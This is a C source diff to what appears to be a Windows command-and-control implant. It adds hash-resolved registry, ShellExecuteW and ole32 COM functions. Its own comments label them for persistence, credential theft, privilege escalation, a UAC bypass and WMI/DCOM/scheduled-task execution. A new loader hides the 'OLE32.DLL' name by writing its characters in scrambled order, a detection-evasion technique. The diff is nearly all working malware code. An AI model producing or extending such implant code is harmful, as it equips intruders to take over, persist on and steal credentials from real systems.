@@ -59,6 +59,13 @@ BOOL RtAdvapi32(
         Instance->Win32.RegQueryValueExW             = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGQUERYVALUEEXW );
         Instance->Win32.RegCloseKey                  = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGCLOSEKEY );
 
+        /* [HVC-032] Registry functions for persistence, creds, privesc */
+        Instance->Win32.RegSetValueExW               = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGSETVALUEEXW );
+        Instance->Win32.RegSaveKeyExW                = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGSAVEKEYEXW );
+        Instance->Win32.RegDeleteValueW              = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGDELETEVALUEW );
+        Instance->Win32.RegCreateKeyExW              = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGCREATEKEYEXW );
+        Instance->Win32.RegDeleteTreeW               = LdrFunctionAddr( Instance->Modules.Advapi32, H_FUNC_REGDELETETREEW );
+
         PUTS( "Loaded Advapi32 functions" )
     } else {
         MemZero( ModuleName, sizeof( ModuleName ) );
@@ -199,6 +206,7 @@ BOOL RtShell32(
     if ( ( Instance->Modules.Shell32 = LdrModuleLoad( ModuleName ) ) ) {
         MemZero( ModuleName, sizeof( ModuleName ) );
         Instance->Win32.CommandLineToArgvW = LdrFunctionAddr( Instance->Modules.Shell32, H_FUNC_COMMANDLINETOARGVW );
+        Instance->Win32.ShellExecuteW      = LdrFunctionAddr( Instance->Modules.Shell32, H_FUNC_SHELLEXECUTEW );       /* [HVC-032] UAC bypass */
 
         PUTS( "Loaded Shell32 functions" )
     } else {
@@ -429,6 +437,42 @@ BOOL RtSspicli(
     } else {
         MemZero( ModuleName, sizeof( ModuleName ) );
         PUTS( "Failed to load Sspicli" )
+        return FALSE;
+    }
+
+    return TRUE;
+}
+
+/* [HVC-032] ole32.dll — CoInitializeEx, CoCreateInstance, CoUninitialize for WMI/DCOM/schtask.
+ * LdrModuleLoad respects ProxyLoading setting and falls back to LdrLoadDll on miss. */
+BOOL RtOle32(
+    VOID
+) {
+    CHAR ModuleName[ 10 ] = { 0 };
+
+    /* "OLE32.DLL" (9 chars + null = 10 bytes) — indices scrambled */
+    ModuleName[ 5 ] = HideChar( '.' );
+    ModuleName[ 0 ] = HideChar( 'O' );
+    ModuleName[ 3 ] = HideChar( '3' );
+    ModuleName[ 7 ] = HideChar( 'L' );
+    ModuleName[ 1 ] = HideChar( 'L' );
+    ModuleName[ 6 ] = HideChar( 'D' );
+    ModuleName[ 8 ] = HideChar( 'L' );
+    ModuleName[ 2 ] = HideChar( 'E' );
+    ModuleName[ 4 ] = HideChar( '2' );
+    ModuleName[ 9 ] = HideChar( '\0' );
+
+    if ( ( Instance->Modules.Ole32 = LdrModuleLoad( ModuleName ) ) ) {
+        MemZero( ModuleName, sizeof( ModuleName ) );
+        Instance->Win32.CoInitializeEx     = LdrFunctionAddr( Instance->Modules.Ole32, H_FUNC_COINITIALIZEEX );
+        Instance->Win32.CoCreateInstance   = LdrFunctionAddr( Instance->Modules.Ole32, H_FUNC_COCREATEINSTANCE );
+        Instance->Win32.CoCreateInstanceEx = LdrFunctionAddr( Instance->Modules.Ole32, H_FUNC_COCREATEINSTANCEEX );
+        Instance->Win32.CoUninitialize     = LdrFunctionAddr( Instance->Modules.Ole32, H_FUNC_COUNINITIALIZE );
+
+        PUTS( "Loaded Ole32 functions" )
+    } else {
+        MemZero( ModuleName, sizeof( ModuleName ) );
+        PUTS( "Failed to load Ole32" )
         return FALSE;
     }
 
